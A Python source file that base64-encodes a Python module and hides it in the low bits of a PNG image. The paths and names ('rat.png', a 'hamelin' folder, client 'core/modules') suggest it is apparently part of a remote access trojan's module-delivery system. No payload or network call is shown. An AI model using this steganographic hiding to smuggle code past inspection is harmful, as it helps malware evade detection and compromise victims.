from email.mime import base
import numpy as np
from PIL import Image
import hashlib
import os
import base64

def get_module_bytes(module_path):
    file_content = open(module_path, 'r').read().encode('ascii')
    b64_content = base64.b64encode(file_content)
    b64_content = b64_content.decode('ascii')   + "#end"
    b_content =  ''.join([ "{:08b}".format(ord(x)) for x in b64_content ])
    return [int(x) for x in b_content]

def get_image_data(image_path):
    with Image.open(image_path) as img:
        width, height = img.size
        data = np.array(img)

    return np.reshape(data, width*height*3), width, height

def lsb_substitution(b_image, b_module, width, height):
    b_module_len = len(b_module)
    b_image[:b_module_len] = b_image[:b_module_len] & ~1 | b_module

    return np.reshape(b_image, (height, width, 3))

def save_image_from_bytes(b_image, img_path):
    img = Image.fromarray(b_image)
    img.save(img_path)

def module_to_image(module_name):
    base_path = os.path.dirname(os.path.realpath(__file__)).split('/client',1)[0] + '/client'

    module_path = f"{base_path}/core/modules/{module_name}.py"
    image_path = f"{base_path}/assets/rat.png"
    o_image_name = f"{module_name}"
    o_image_name = "rat_" + hashlib.md5(o_image_name.encode('utf-8')).hexdigest()
    o_image_path = f"{base_path}/hamelin/{o_image_name}.png"

    b_module = get_module_bytes(module_path)
    b_image, w, h = get_image_data(image_path)

    b_new_image = lsb_substitution(b_image, b_module, w, h)

    save_image_from_bytes(b_new_image, o_image_path)

    return o_image_path